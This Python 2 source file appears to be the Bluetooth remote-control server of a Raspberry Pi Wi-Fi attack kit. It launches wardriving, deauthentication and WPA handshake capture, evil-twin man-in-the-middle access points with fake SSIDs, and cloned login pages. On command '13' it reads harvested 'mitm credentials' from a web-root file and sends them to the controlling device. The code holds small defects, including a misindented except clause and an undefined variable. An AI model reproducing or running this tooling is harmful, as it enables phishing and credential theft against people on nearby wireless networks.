import os
import sys
import signal
import time
from multiprocessing import Process
from subprocess import Popen
from bluetooth import *


last_val = []

data = ''

# /etc/rc.d/rc.local
# https://www.dexterindustries.com/howto/run-a-program-on-your-raspberry-pi-at-startup/
# airmon-ng start wlan2mon
# sudo python last.py > output.txt




def control_write(data):
    with open("control", 'w') as f:
        f.write(str(data))


def control_read():
    with open("control", 'r') as f:
        return int(f.read())


control_write(1)
#BLSERVER 
connection = False
server_sock = BluetoothSocket(RFCOMM)
server_sock.bind(("", PORT_ANY))
server_sock.listen(1)

port = server_sock.getsockname()[1]

uuid = ""#uuid

advertise_service(server_sock, "Server", service_id=uuid, service_classes=[
                  uuid, SERIAL_PORT_CLASS], profiles=[SERIAL_PORT_PROFILE])


while True:
    control = control_read()
    while connection == False:
        print("Waiting connection")
        client_sock, client_info = server_sock.accept()
        connection = True
        print("Conn:", client_info)
    try:
        data = client_sock.recv(1024)
        client_sock.send("%s" % data)
    except:
        print "Error recv data"
        client_sock, client_info = server_sock.accept()
        connection = True
    if data == "13":
        #mitm credentials
        logins = ''
        with open('/var/www/html/data.txt', 'r') as f:
            logins += f.read()
        try:
            client_sock.send("%s" % logins)
        except:
            print "Error 13!"
    if data == "10":
        #read outputs to last.py
        print "10"
        client_sock.send("10")
        with open("output.txt") as f:
            send_them = f.readlines()
            
        try:
            for i in send_them:
                client_sock.send("%s" % i)
                print i
                
        except:
            print "Error did not send (10)"
            
        # client_sock.send("10")
    if ((control == -1 and data != "3") or control == 0) and data != "5" and data != "10" and data != "13":
        try:
            client_sock.send("\nThere is running process")
        except:
            print "Error client lost"
            client_sock, client_info = server_sock.accept()
            connection = True

    if data != '' and data == "5":
        print '---'+data
        
        print('KILL THEM')
        
        if len(last_val) > 0:
            tmp = last_val[-1]
        else:
            tmp = 0
        if tmp == "1":
            print("1")
            
            print(p.pid)
            os.kill(p.pid, signal.SIGINT)
            os.kill(p.pid, signal.SIGINT)
            time.sleep(3)
            os.kill(p.pid, signal.SIGINT)
            os.kill(p.pid, signal.SIGINT)
            print(p.pid)

            print("..")
            # time.sleep(4)
            # Popen.terminate(p)
            print("scapydeter dead")

        elif tmp == "2" or tmp == "3":
            print("2")
            try:
                for q in range(0, 2):
                    os.kill(p1.pid, signal.SIGINT)
                    os.kill(p2.pid, signal.SIGINT)
                    time.sleep(2)
                    # print("2.")
                    os.kill(p1.pid, signal.SIGINT)
                    os.kill(p2.pid, signal.SIGINT)
                # Popen.terminate(p2)

                # Popen.terminate(p1)
            except:
                os.kill(p1.pid, signal.SIGINT)
                time.sleep(2)
                os.kill(p1.pid, signal.SIGINT)
                print("handshake or dea2 or both them dead")

        elif tmp == "6":
            print("6")
            Popen.terminate(p3)
        elif tmp == "7":
            print("7")
            Popen.terminate(p4)
        elif tmp == "8":
            print("8")
            os.kill(p5.pid, signal.SIGINT)
            time.sleep(2)
            os.kill(p5.pid, signal.SIGINT)
            # Popen.terminate(p5)
        elif tmp == "9":
            print("9")
            Popen.terminate(p6)
        control_write(1)
    if control == -1 and data == "3":
        print("Deauth for handshake")
        last_val.append("3")
        # p2=Process(target=dea2)
        # p2.start()
        control_write(0)
        p2 = Popen(['python', 'dea2.py'])
    elif data == "3":
        try:
            client_sock.send("\nThere is no  running handshake process")
        except:
            print "Error in dea2"
    if control > 0:
        
        try:
            
            if data == "1":
                print "Wardriving"
                last_val.append("1")
            
                control_write(0)
                p = Popen(['python', 'scapydeter.py'])
            
            elif data == "2":
                print "Handshake"
                last_val.append("2")
            
                control_write(-1)

                p1 = Popen(['python', 'handshake.py'])
               
            elif data[0] == "6":
                print "MiTM no internet"
                last_val.append("6")
                try:
                    fake_ssid=data.split(" ")[1]
                except:
                    fake_ssid="null"
                control_write(0)
                p3 = Popen(['python', 'mitm.py',fake_ssid])
           

            elif data[0] == "7":
                print "MiTM internet"
                last_val.append("7")
           
                control_write(0)
                try:
                    interface = data.split(" ")[1]
                    fake_ssid=data.split(" ")[2]
                except:
                    interface = 'wlan0'
                    fake_ssid="null"
                p4 = Popen(['python', 'netmitm1.py', interface,fake_ssid])
            
            elif data == "8":
                print "Deauthentication"
                last_val.append("8")
                control_write(0)
                p5 = Popen(['python', 'dea.py', '2'])
            
            elif data[0] == "9":
                print "Copy Login Page"
                last_val.append("9")
                try:
                    dt = data.split(" ")[1]
               
                    control_write(0)
                    p6 = Popen(['python', 'connectt.py', dt])
                 except:
                    print("Error there is no link")
            
            elif data == "11":
                print "Copy default fake page"
                #os.system('sudo python3 gethtml.py http://site.com 0')
                os.system('python copyy.py 0')
                try:
                    client_sock.send("%s" % i)
                except:
                    print "Error 11!"
            elif data == "4":
                client_sock.close()
                connection = False
            elif data == "12":
                os.system('shutdown -r 0')
           
        except IOError:
            print "Connection IOError"
            client_sock.close()
            connection = False
            pass
        except BluetoothError:
            print("Ble Error")
        except KeyboardInterrupt:
            print("Keyboard Int")
            client_sock.close()
            server_sock.close()
            break
